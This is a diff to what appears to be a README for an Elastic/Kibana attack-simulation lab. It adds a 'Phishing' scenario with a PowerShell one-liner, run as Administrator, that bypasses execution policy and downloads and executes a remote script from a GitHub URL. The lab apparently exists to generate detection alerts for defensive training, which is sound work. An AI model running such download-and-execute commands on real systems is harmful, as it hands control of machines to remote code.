@@ -52,6 +52,13 @@ Open Powershell as `Administrator` and execute the code below.
 This will generate logs and alerts within Kibana. 
 Depening on the scenario the powershell scripts can take from 5 - 30 minutes to execute.  
 When you what to reset the VM or clean up after the attack just select the restart snapshot.
+
+#### Phishing ####
+
+```
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phish.ps1')"
+
+```
   
 #### Ransomware ####
 
